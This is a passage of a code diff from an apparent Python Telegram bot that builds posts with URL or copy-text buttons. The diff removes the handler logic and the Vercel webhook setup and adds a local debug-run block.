-        user_data_store[user_id]["media_type"] = media_type
-        user_data_store[user_id]["file_id"] = file_id
-        user_data_store[user_id]["caption"] = update.message.caption or ""
-        user_data_store[user_id]["original_text"] = user_data_store[user_id]["caption"]
-        await show_preview_and_ask_buttons(update, context)
-        return
-
-    if step == "waiting_button_text":
-        user_data_store[user_id]["temp_button"]["text"] = update.message.text.strip()
-        user_data_store[user_id]["step"] = "waiting_button_data"
-        if user_data_store[user_id]["temp_button"].get("type") == "url":
-            await update.message.reply_text("🔗 Enter URL (http:// or https://):")
-        else:
-            await update.message.reply_text("📋 Enter text to copy:")
-        return
-
-    if step == "waiting_button_data":
-        btn_data = update.message.text.strip()
-        if user_data_store[user_id]["temp_button"].get("type") == "url":
-            if not btn_data.startswith(("http://", "https://")):
-                await update.message.reply_text("❌ Invalid URL. Try again:")
-                return
-            user_data_store[user_id]["temp_button"]["url"] = btn_data
-        else:
-            user_data_store[user_id]["temp_button"]["copy_text"] = btn_data
-        user_data_store[user_id]["step"] = "waiting_button_color"
-        await update.message.reply_text("🎨 Select color:", reply_markup=await button_colors_kb(), parse_mode="HTML")
-        return
-
-    if step == "waiting_more_buttons":
-        if update.message.text.strip().lower() == "/addbutton":
-            user_data_store[user_id]["step"] = "waiting_button_type"
-            await update.message.reply_text("🎯 Button type:", reply_markup=await button_type_kb(), parse_mode="HTML")
-        elif update.message.text.strip().lower() == "/donebuttons":
-            await show_final_preview(update, context)
-        else:
-            await update.message.reply_text("Send /addbutton or /donebuttons")
-        return
-
-# ---------- Build application ----------
-def create_application():
-    load_emojis()
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("make_post", make_post_command))
-    app.add_handler(CommandHandler("cancel", cancel_command))
-    app.add_handler(CommandHandler("addbutton", handle_message))
-    app.add_handler(CommandHandler("donebuttons", handle_message))
-    app.add_handler(CallbackQueryHandler(handle_callback_query))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO | filters.Document.ALL | filters.AUDIO | filters.ANIMATION, handle_message))
-    return app
-
-# ---------- Vercel entry point ----------
-logger.info("Initializing bot...")
-_app = create_application()
-
-# Safely build the ASGI app – never directly use .webhook_app without fallback
-try:
-    app = _app.webhook_app
-    logger.info("Using app.webhook_app")
-except AttributeError:
-    logger.warning("webhook_app missing, using _build_webhook_app()")
-    app = _app._build_webhook_app()
-    logger.info("Built webhook app via _build_webhook_app()")
-
-logger.info("Bot initialized successfully.")
-
-# For local testing (optional)
-if __name__ == "__main__":
-    print("Starting local polling...")
-    create_application().run_polling(allowed_updates=Update.ALL_TYPES)
+# For local testing
+if __name__ == '__main__':
+    app.run(debug=True)
